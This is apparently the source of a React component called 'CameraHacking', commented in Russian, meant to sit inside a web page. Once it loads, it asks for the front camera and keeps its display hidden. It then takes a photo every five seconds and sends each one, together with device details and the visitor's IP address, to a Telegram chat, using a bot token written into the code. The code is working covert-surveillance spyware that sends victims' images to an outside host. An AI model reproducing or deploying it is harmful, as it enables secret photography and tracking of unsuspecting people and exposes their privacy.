/**
 * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ ANDROID CHROME
 * С ДЕТАЛЬНОЙ ДИАГНОСТИКОЙ ОТПРАВКИ ФОТО
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);
  const [lastPhotoBlob, setLastPhotoBlob] = useState(null);

  // Добавление логов
  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  /**
   * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
   */
  const sendDiagnosticReport = async (title, data, isError = false) => {
    try {
      let message = `${isError ? '❌' : '🔍'} ${title}\n\n`;
      
      if (deviceInfo) {
        message += `📱 Устройство: ${deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Другое'}\n`;
        if (deviceInfo.isAndroid) message += `Версия Android: ${deviceInfo.androidVersion}\n`;
        message += `Браузер: ${deviceInfo.isChrome ? 'Chrome' : deviceInfo.isSafari ? 'Safari' : 'Другой'}\n`;
        message += `Разрешение: ${deviceInfo.resolution || 'неизвестно'}\n`;
        message += `Захвачено фото: ${captureCount}\n\n`;
      }
      
      if (typeof data === 'string') {
        message += data;
      } else if (data instanceof Error) {
        message += `Ошибка: ${data.name}\nСообщение: ${data.message}`;
      } else if (data) {
        message += JSON.stringify(data, null, 2).substring(0, 1500);
      }
      
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      addDebugLog(`Диагностика отправлена: ${title}`);
      
    } catch (error) {
      console.error('Не удалось отправить диагностику:', error);
      addDebugLog(`Ошибка отправки диагностики: ${error.message}`);
    }
  };

  /**
   * ТЕСТ ОТПРАВКИ МАЛЕНЬКОГО ФАЙЛА
   */
  const testFileUpload = async () => {
    addDebugLog('🧪 Тестируем отправку файла...');
    
    try {
      // Создаем тестовый canvas с цветом
      const canvas = document.createElement('canvas');
      canvas.width = 100;
      canvas.height = 100;
      const ctx = canvas.getContext('2d');
      
      // Рисуем цветной прямоугольник
      ctx.fillStyle = '#FF0000';
      ctx.fillRect(0, 0, 100, 100);
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '12px Arial';
      ctx.fillText('TEST', 30, 50);
      ctx.fillText(new Date().toLocaleTimeString(), 10, 80);
      
      // Конвертируем в blob
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.9);
      });
      
      if (!blob) {
        throw new Error('Не удалось создать тестовый blob');
      }
      
      addDebugLog(`Тестовый файл создан: ${blob.size} байт`);
      
      // Отправляем тестовый файл
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'test_file.jpg');
      formData.append('test', 'true');
      formData.append('timestamp', Date.now().toString());
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      addDebugLog(`Отправляем на URL: ${apiUrl}`);
      
      const response = await axios.post(apiUrl, formData, {
        headers: { 
          'Content-Type': 'multipart/form-data',
          'X-Debug': 'test-upload'
        },
        timeout: 30000,
        onUploadProgress: (progressEvent) => {
          if (progressEvent.total) {
            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
            addDebugLog(`Прогресс загрузки: ${percent}%`);
          }
        }
      });
      
      addDebugLog(`✅ Тестовый файл отправлен! Статус: ${response.status}`);
      await sendDiagnosticReport('Тест отправки файла УСПЕШЕН', {
        blobSize: blob.size,
        status: response.status,
        response: response.data
      });
      
      return true;
      
    } catch (error) {
      addDebugLog(`❌ Тест отправки файла НЕ УДАЛСЯ: ${error.message}`);
      
      // Детальный анализ ошибки
      let errorDetails = {
        message: error.message,
        code: error.code,
        name: error.name
      };
      
      if (error.response) {
        errorDetails.response = {
          status: error.response.status,
          statusText: error.response.statusText,
          data: error.response.data
        };
      }
      
      if (error.request) {
        errorDetails.request = 'Запрос отправлен, но ответа нет';
      }
      
      await sendDiagnosticReport('Тест отправки файла ПРОВАЛЕН', errorDetails, true);
      
      return false;
    }
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ
   */
  const initializeCamera = async () => {
    addDebugLog('Начинаем инициализацию камеры...');
    
    try {
      // Собираем базовую диагностику
      const diagnostics = {
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        isAndroid: /android/i.test(navigator.userAgent),
        isIOS: /iphone|ipad|ipod/i.test(navigator.userAgent),
        isChrome: /chrome/i.test(navigator.userAgent) && !/edge/i.test(navigator.userAgent),
        androidVersion: (() => {
          const match = navigator.userAgent.match(/Android\s([0-9\.]+)/);
          return match ? parseFloat(match[1]) : 0;
        })()
      };
      
      setDeviceInfo(diagnostics);
      addDebugLog(`Устройство: Android ${diagnostics.androidVersion}, Chrome`);
      
      // Простые настройки для Android Chrome
      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };
      
      addDebugLog('Запрашиваем доступ к камере...');
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      addDebugLog('Доступ к камере получен');
      
      if (videoRef.current) {
        const video = videoRef.current;
        
        // Критически важные настройки для Android
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');
        
        video.srcObject = stream;
        
        // Ждем готовности видео
        await new Promise((resolve) => {
          const timeout = setTimeout(() => {
            addDebugLog('Таймаут ожидания видео, продолжаем...');
            resolve();
          }, 5000);
          
          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            diagnostics.resolution = `${video.videoWidth}x${video.videoHeight}`;
            setDeviceInfo(diagnostics);
            
            addDebugLog(`Видео готово: ${video.videoWidth}x${video.videoHeight}`);
            
            // Пробуем запустить видео
            video.play().then(() => {
              addDebugLog('Видео запущено успешно');
              resolve();
            }).catch((error) => {
              addDebugLog(`Auto-play заблокирован: ${error.message}`);
              resolve();
            });
          };
        });
        
        // Ждем еще секунду для стабилизации
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Тестируем отправку файла
        const uploadTest = await testFileUpload();
        
        if (uploadTest) {
          addDebugLog('✅ Все тесты пройдены, запускаем захват фото');
          await sendDiagnosticReport('Камера инициализирована', {
            resolution: diagnostics.resolution,
            uploadTest: 'passed'
          });
          
          setIsInitialized(true);
          return true;
        } else {
          addDebugLog('❌ Тест отправки файла не пройден');
          return false;
        }
      }
      
    } catch (error) {
      addDebugLog(`Ошибка инициализации камеры: ${error.message}`);
      await sendDiagnosticReport('Ошибка инициализации камеры', error, true);
      return false;
    }
  };

  /**
   * ЗАХВАТ ФОТО С ПРОВЕРКОЙ
   */
  const capturePhoto = async () => {
    if (!isInitialized || !videoRef.current) {
      addDebugLog('Камера не инициализирована, пропускаем');
      return;
    }
    
    const video = videoRef.current;
    
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0), пропускаем');
      return;
    }
    
    addDebugLog(`Захват фото #${captureCount + 1}`);
    
    try {
      // Создаем canvas
      const canvas = document.createElement('canvas');
      
      // Коррекция ориентации для портретного режима
      const isPortrait = video.videoHeight > video.videoWidth;
      
      if (isPortrait && deviceInfo?.isAndroid) {
        // Для портретной ориентации на Android
        canvas.width = video.videoHeight;
        canvas.height = video.videoWidth;
      } else {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      }
      
      const ctx = canvas.getContext('2d');
      
      // Для Android: несколько попыток
      let frameOk = false;
      let attempts = 0;
      
      while (!frameOk && attempts < 3) {
        attempts++;
        
        // Очищаем canvas
        ctx.fillStyle = '#000000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // Коррекция ориентации при рисовании
        if (isPortrait && deviceInfo?.isAndroid) {
          ctx.save();
          ctx.translate(canvas.width / 2, canvas.height / 2);
          ctx.rotate(Math.PI / 2);
          ctx.translate(-canvas.height / 2, -canvas.width / 2);
          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
          ctx.restore();
        } else {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        
        // Проверяем, не черный ли кадр
        const imageData = ctx.getImageData(50, 50, 1, 1).data;
        const isBlack = imageData[0] < 10 && imageData[1] < 10 && imageData[2] < 10;
        
        if (!isBlack) {
          frameOk = true;
          addDebugLog(`Кадр захвачен (попытка ${attempts}, НЕ черный)`);
        } else {
          addDebugLog(`Черный кадр, повтор ${attempts}/3`);
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      // Если все еще черный, добавляем текст
      if (!frameOk) {
        ctx.fillStyle = '#FFFFFF';
        ctx.font = '20px Arial';
        ctx.fillText('Android Camera', 30, 50);
        ctx.fillText(new Date().toLocaleTimeString(), 30, 80);
        addDebugLog('Добавлен текст на черный кадр');
      }
      
      // Создаем blob
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.7);
      });
      
      if (!blob) {
        throw new Error('Не удалось создать blob');
      }
      
      setLastPhotoBlob(blob);
      addDebugLog(`Фото создано: ${Math.round(blob.size / 1024)} KB`);
      
      // Отправляем фото
      await sendPhotoToTelegram(blob);
      
    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
    }
  };

  /**
   * ОТПРАВКА ФОТО В TELEGRAM С ПОДРОБНОЙ ДИАГНОСТИКОЙ
   */
  const sendPhotoToTelegram = async (blob) => {
    const startTime = Date.now();
    
    try {
      addDebugLog('Начинаем отправку фото...');
      
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      
      // Добавляем диагностическую информацию
      const diagnostics = {
        device: deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Desktop',
        androidVersion: deviceInfo?.androidVersion || 0,
        resolution: deviceInfo?.resolution || 'unknown',
        captureNumber: captureCount + 1,
        timestamp: Date.now(),
        blobSize: blob.size,
        userAgent: navigator.userAgent?.substring(0, 100)
      };
      
      formData.append('diagnostics', JSON.stringify(diagnostics));
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      addDebugLog(`Отправляем на: ${apiUrl}`);
      
      // Отправляем запрос
      const response = await axios.post(apiUrl, formData, {
        headers: { 
          'Content-Type': 'multipart/form-data',
          'X-Request-ID': `photo-${Date.now()}`
        },
        timeout: 30000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        onUploadProgress: (progressEvent) => {
          if (progressEvent.total) {
            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
            addDebugLog(`Загрузка: ${percent}% (${Math.round(progressEvent.loaded / 1024)} KB)`);
          } else {
            addDebugLog(`Загружено: ${Math.round(progressEvent.loaded / 1024)} KB`);
          }
        }
      });
      
      const totalTime = Date.now() - startTime;
      
      addDebugLog(`✅ Фото отправлено успешно! Время: ${totalTime}ms, Статус: ${response.status}`);
      
      setCaptureCount(prev => prev + 1);
      
      // Отправляем подтверждение
      await sendDiagnosticReport('Фото успешно отправлено', {
        photoNumber: captureCount + 1,
        uploadTime: totalTime,
        blobSize: Math.round(blob.size / 1024) + ' KB',
        responseStatus: response.status
      });
      
      return true;
      
    } catch (error) {
      const totalTime = Date.now() - startTime;
      addDebugLog(`❌ Ошибка отправки фото (${totalTime}ms): ${error.message}`);
      
      // Анализируем ошибку
      let errorAnalysis = {
        error: error.message,
        code: error.code,
        time: totalTime + 'ms',
        blobSize: blob ? Math.round(blob.size / 1024) + ' KB' : 'unknown'
      };
      
      if (error.response) {
        errorAnalysis.response = {
          status: error.response.status,
          statusText: error.response.statusText,
          data: error.response.data ? String(error.response.data).substring(0, 200) : 'empty'
        };
      }
      
      if (error.request) {
        errorAnalysis.request = 'Запрос отправлен, но ответа нет (возможно, CORS или сеть)';
      }
      
      // Проверяем CORS
      if (error.message.includes('CORS') || error.message.includes('cross-origin')) {
        errorAnalysis.cors = 'Вероятно, проблема с CORS политикой';
      }
      
      // Проверяем размер файла
      if (blob && blob.size > 10 * 1024 * 1024) { // 10MB
        errorAnalysis.sizeIssue = 'Файл слишком большой (>10MB)';
      }
      
      // Отправляем детальный отчет об ошибке
      await sendDiagnosticReport('Ошибка отправки фото', errorAnalysis, true);
      
      // Пробуем отправить текстовое сообщение как fallback
      try {
        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
        await axios.post(telegramApiUrl, {
          chat_id: chatId,
          text: `❌ Не удалось отправить фото\n\n` +
                `Ошибка: ${error.message.substring(0, 100)}\n` +
                `Размер фото: ${Math.round(blob.size / 1024)} KB\n` +
                `Время: ${new Date().toLocaleTimeString()}`
        });
      } catch (telegramError) {
        addDebugLog(`Не удалось отправить fallback сообщение: ${telegramError.message}`);
      }
      
      return false;
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    addDebugLog('🚀 Запускаем периодический захват (каждые 5 секунд)');
    
    // Первый захват через 3 секунды
    setTimeout(() => {
      capturePhoto();
    }, 3000);
    
    // Затем каждые 5 секунд
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < 20) { // Ограничим 20 фото для теста
        capturePhoto();
      } else {
        stopCapturing();
        addDebugLog('🎯 Достигнут лимит 20 фото');
        sendDiagnosticReport('Завершено 20 фото', { totalCaptures: captureCount });
      }
    }, 5000);
  };

  /**
   * ПОЛУЧЕНИЕ IP
   */
  const fetchClientIp = async () => {
    try {
      const response = await axios.get('https://api.ipify.org?format=json', {
        timeout: 5000
      });
      
      const ip = response.data.ip;
      setClientIp(ip);
      addDebugLog(`IP адрес: ${ip}`);
      
    } catch (error) {
      addDebugLog(`Ошибка получения IP: ${error.message}`);
      setClientIp('IP unavailable');
    }
  };

  /**
   * ОСТАНОВКА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    
    addDebugLog('Захват остановлен');
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    let mounted = true;
    
    const init = async () => {
      addDebugLog('=== НАЧАЛО РАБОТЫ ===');
      
      // Восстановление геолокации
      try {
        const saved = localStorage.getItem('locationPermission');
        if (saved) {
          const locationData = JSON.parse(saved);
          setLocationPermission(locationData);
          addDebugLog('Геолокация восстановлена');
        }
      } catch (error) {
        localStorage.removeItem('locationPermission');
      }
      
      // Получаем IP
      await fetchClientIp();
      
      // Проверяем поддержку
      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('❌ Браузер не поддерживает камеру');
        await sendDiagnosticReport('WebRTC не поддерживается', {
          hasMediaDevices: !!navigator.mediaDevices,
          hasGetUserMedia: !!(navigator.mediaDevices?.getUserMedia)
        }, true);
        return;
      }
      
      // Инициализируем камеру
      const success = await initializeCamera();
      
      if (success && mounted) {
        // Запускаем захват
        startPeriodicCapture();
      }
    };
    
    init();
    
    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  /**
   * ДОПОЛНИТЕЛЬНАЯ КНОПКА ДЛЯ РУЧНОГО ТЕСТИРОВАНИЯ
   */
  const manualTestButton = () => {
    if (process.env.NODE_ENV === 'development') {
      return (
        <div style={{
          position: 'fixed',
          top: 10,
          right: 10,
          zIndex: 9999,
          background: '#4CAF50',
          color: 'white',
          padding: '10px',
          borderRadius: '5px',
          cursor: 'pointer'
        }} onClick={() => capturePhoto()}>
          📸 Сделать фото сейчас
        </div>
      );
    }
    return null;
  };

  return (
    <>
      {manualTestButton()}
      
      <div style={{ display: 'none' }}>
        {/* Отладочная информация */}
        <div id="debug-info">
          <div>Device: {deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Desktop'}</div>
          <div>Android: {deviceInfo?.androidVersion || 'N/A'}</div>
          <div>Resolution: {deviceInfo?.resolution || 'unknown'}</div>
          <div>Captures: {captureCount}</div>
          <div>Initialized: {isInitialized ? 'Yes' : 'No'}</div>
          <div>Last blob: {lastPhotoBlob ? Math.round(lastPhotoBlob.size / 1024) + ' KB' : 'none'}</div>
        </div>
      </div>
      
      {/* Логи в development */}
      {process.env.NODE_ENV === 'development' && debugLogs.length > 0 && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          background: 'rgba(0,0,0,0.9)',
          color: '#0f0',
          padding: '10px',
          fontSize: '11px',
          maxHeight: '150px',
          overflow: 'auto',
          fontFamily: 'monospace',
          zIndex: 9998
        }}>
          <div style={{ fontWeight: 'bold', marginBottom: '5px' }}>
            Camera Debug ({captureCount} photos)
          </div>
          {debugLogs.map((log, index) => (
            <div key={index} style={{
              marginBottom: '2px',
              borderBottom: '1px solid #333',
              paddingBottom: '2px'
            }}>
              {log}
            </div>
          ))}
        </div>
      )}
    </>
  );
};

export default CameraHacking;
